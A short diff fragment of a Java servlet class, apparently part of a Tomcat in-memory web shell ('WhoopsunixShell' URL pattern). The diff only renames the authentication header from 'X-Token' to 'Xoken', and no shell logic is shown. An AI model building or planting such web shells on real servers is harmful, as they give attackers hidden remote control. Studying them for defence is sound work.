@@ -15,7 +15,7 @@ import java.lang.reflect.Method;
 public class TomcatServletWebAppMS implements Servlet {
     private static String NAME = "Whoopsunix";
     private static String pattern = "/WhoopsunixShell";
-    private static String header = "X-Token";
+    private static String header = "Xoken";
 
     public TomcatServletWebAppMS() {
 
